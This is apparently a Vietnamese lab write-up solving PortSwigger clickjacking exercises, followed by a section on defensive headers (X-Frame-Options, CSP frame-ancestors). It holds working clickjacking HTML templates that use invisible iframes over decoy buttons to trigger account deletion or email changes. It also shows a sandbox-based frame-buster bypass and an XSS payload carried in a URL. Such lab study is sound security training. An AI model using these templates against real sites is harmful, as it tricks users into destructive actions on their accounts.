---
title: "[PortSwigger Lab] - Clickjacking"
description: Solution of Clickjacking Lab
date: 2025-06-23 20:34:00 +0700
categories: [Cyber ​​Security, Web Pentest]
tags: [portswigger, burpsuite, labs, web, vulnerability, clickjacking]   
pin: false
comments: true
image:
    path: https://raw.githubusercontent.com/waibui/blog-assets/refs/heads/main/imgs/posts/2025-06-23-portswigger-lab-clickjacking/clickjacking.png
    alt: Clickjacking
---

## Introduction
---
### **Clickjacking**
**Clickjacking** (tấn công đánh lừa người dùng nhấp chuột) là kỹ thuật lừa người dùng bấm vào một thành phần thật trên trang web khác mà họ không hề hay biết, bằng cách che giấu nội dung thật sau lớp hiển thị giả mạo **(decoy)**.

### How users are fooled
1. Kẻ tấn công tạo một trang web mồi **(decoy site)** với lời dụ dỗ như `"Bấm để nhận quà"`.
2. Đặt một **iframe** vô hình chứa trang thật đè lên vị trí nút mà người dùng sẽ bấm.
3. Khi người dùng bấm vào nút đó, thực tế là họ đã thực hiện hành động thật trên trang web đang đăng nhập (ví dụ: `chuyển tiền`, `xóa tài khoản`,...).

## Solve Clickjacking Lab
---
### Lab: Basic clickjacking with CSRF token protection
- Login bằng account **wiener**, ta thấy nút **Delete account**

```html
<style>
    iframe {
        position:relative;
        width:700px;
        height: 500px;
        opacity: 0.000001;
        z-index: 2;
    }
    div {
        position:absolute;
        top:450px;
        left:70px;
        z-index: 1;
    }
</style>
<div>Click me</div>
<iframe src="https://0a12009203c03c94824a673e0038006f.web-security-academy.net/my-account"></iframe>
```
- Tạo **iframe** để nhúng một tài liệu khác trong tài liệu **HTML** hiện tại, ở đây là nhúng `/account`
- Tạo thẻ `<div>Click me</div>` để lừa người dùng **click** vào nhưng `z-index: 1`, nhỏ hơn `z-index: 2` của **iframe** nên thứ thật sự **click** là phần tử trên **iframe** 
- Tuy **iframe** nằm lớp trên nhưng đã được làm mờ bởi thuộc tính `opacity: 0.000001` nên người dùng chỉ thấy `<div>Click me</div>`
- `"Click me"` sẻ trùng với vị trí của `"Delete account"` nên thực chất sẽ `"Delete account"` khi **click** vào `"Click me"`

### Lab: Clickjacking with form input data prefilled from a URL parameter
- Login bằng account `wiener`
- Thay đổi **url** thành `https://0a870080039ca4d9808d03fe00f6008d.web-security-academy.net/my-account?email=xnxx@gmail.com` ta sẽ thấy **input** được set **email**

```html
<form class="login-form" name="change-email-form" action="/my-account/change-email" method="POST">
    <label>Email</label>
    <input required="" type="email" name="email" value="xnxx@gmail.com">
    <input required="" type="hidden" name="csrf" value="KCwMDXJaQ1fBmCAygvCB7y75Z3B0zNYs">
    <button class="button" type="submit"> Update email </button>
</form>
```
- Tạo **HTML template** vào **body** của **exploit server**
    - Có thể tạo như **lab** trên nhưng chỉnh vị trí cũng khá tốn thời gian
    - Sử dụng **Burp Clickbandit** để hỗ trợ tạo **PoC (Proof of Concept)** cho **Clickjacking** 
        - Click **Burp** > **Burp Clickbandit** > **Copy Clickbandit to Clipboard**
        - Mở **devtool** của trang `/my-account?email=xnxx@gmail.com`, gõ `allow pasting` để cho phép dán nội dung vào **console**
        - Dán mã **Clickbandit** copy trước đó vào và thực hiện tạo **template**
            - Check `Disable click actions` để không thực hiện hành động, chỉ chọn **element**
            - **Start** > chọn button `Update email` > **Tonggle transparency** > **Finish** > **Save**
            - Copy template được tạo và dán vào **body** của **exploit server**
- **Delive to victim**

### Lab: Clickjacking with a frame buster script
- Login bằng account `wiener`
- Thay đổi **url** thành `https://0a870080039ca4d9808d03fe00f6008d.web-security-academy.net/my-account?email=xnxx@gmail.com` ta sẽ thấy **input** được set **email**
- Tương tự như lab trên nhưng ta sẽ không dùng **Clickbandit**, bởi vì nó **focus** khoảng khác rộng, **client** khó nhấp trúng
- Sử dụng template ở dưới, thêm vào body của **exploit server**

```html
<style>
    iframe {
        position:relative;
        width:700px;
        height: 500px;
        opacity: 0.1;
        z-index: 2;
    }
    div {
        position:absolute;
        top:450px;
        left:70px;
        z-index: 1;
    }
</style>
<div>Click me</div>
<iframe src="https://0a1a0097049af8b1807d03e6002a005a.web-security-academy.net/my-account?email=xnxx@gmail.com" sandbox="allow-forms"></iframe>
```
- **Delive to victim**
- Ứng dụng đã sử dụng kỹ thuật **frame busting**  (hay **frame breaking**) để ngăn bị hiển thị trong **iframe**

```html
<script>
if(top != self) {
    window.addEventListener("DOMContentLoaded", function() {
        document.body.innerHTML = 'This page cannot be framed';
    }, false);
}
</script>
```
- Ta sử dụng `sandbox="allow-forms"`
    - Mặc định nếu thêm `sandbox` mà không cần thêm thuộc tính gì thì nó sẽ block tất cả
    - Ở đây ta thêm `allow-forms` để cho phép **form** được hoạt động

### Lab: Exploiting clickjacking vulnerability to trigger DOM-based XSS
- Thử xung quanh ta thấy **XSS** xảy ra ở **payload name** chức năng **feedback**
- Ta sẽ thêm vào các **input** thông qua **url** 

```
https://0ae1005204976ded801b08ea005b0032.web-security-academy.net/feedback?name=%3Cimg%20src=1%20onerror=print()%3E&email=xnxx@gmail.com&subject=xnxx&message=xnxx
```
- Có thể tạo bằng **Clickbandit** hoặc sử dụng **template** sau thêm vào body của **exploit server**

```html
<style>
    iframe {
        position:relative;
        width:700px;
        height: 850px;
        opacity: 0.00001;
        z-index: 2;
    }
    div {
        position:absolute;
        top:790px;
        left:70px;
        z-index: 1;
    }
</style>
<div>Click me</div>
<iframe src="https://0ae1005204976ded801b08ea005b0032.web-security-academy.net/feedback?name=%3Cimg%20src=1%20onerror=print()%3E&email=xnxx@gmail.com&subject=xnxx&message=xnxx"></iframe>
```
- **Delive to victim**

### Lab: Multistep clickjacking
- Login bằng account **wiener**, ta thấy nút **Delete account**
- Sử dụng **template** sau thêm vào body của **exploit server**

```html
<style>
iframe {
    position: relative;
    width: 700px;
    height: 600px;
    opacity: 0.5;
    z-index: 2;
}

#click-first, #click-second {
    position: absolute;
    top: 496px;
    left: 56px;
    z-index: 1;
}

#click-second {
    top: 293px;
    left: 200px;
}
</style>

<div id="click-first">Click me first</div>
<div id="click-second">Click me second</div>
<iframe src="https://0acf00a40379a083841a04d6001600c4.web-security-academy.net/my-account"></iframe>
```
- **Deliver to victim**

## Prevent
---
Hai cơ chế chính được hỗ trợ bởi trình duyệt để chống **clickjacking**:
- **X-Frame-Options:** Là một **HTTP response header**, quy định xem trang có được phép nhúng vào **iframe** hay không.

| Cấu hình                                                 | Ý nghĩa                                                                               |
| -------------------------------------------------------- | ------------------------------------------------------------------------------------- |
| `X-Frame-Options: deny`                                  | Cấm hoàn toàn việc nhúng vào iframe                                                   |
| `X-Frame-Options: sameorigin`                            | Chỉ cho phép iframe từ cùng domain                                                    |
| `X-Frame-Options: allow-from https://normal-website.com` | Chỉ cho phép nhúng từ trang cụ thể *(chú ý: không hỗ trợ tốt trong Chrome và Safari)* |

- **Content Security Policy (CSP)**
    - **CSP** là một hệ thống quản lý chính sách bảo mật nội dung thông qua các **header HTTP**.
    - Được dùng để giảm thiểu rủi ro như **XSS**, **clickjacking** bằng cách hạn chế nguồn nội dung được tải và cách nội dung hiển thị.

Dùng cho **clickjacking**, bạn cần thêm chỉ thị **frame-ancestors**:

| Cấu hình CSP                                                           | Ý nghĩa                                         |
| ---------------------------------------------------------------------- | ----------------------------------------------- |
| `Content-Security-Policy: frame-ancestors 'none';`                     | Không cho phép bất kỳ trang nào nhúng trang này |
| `Content-Security-Policy: frame-ancestors 'self';`                     | Chỉ cho phép nhúng từ chính cùng domain         |
| `Content-Security-Policy: frame-ancestors https://normal-website.com;` | Chỉ cho phép nhúng từ domain chỉ định           |

---
Goodluck! 🍀🍀🍀 


 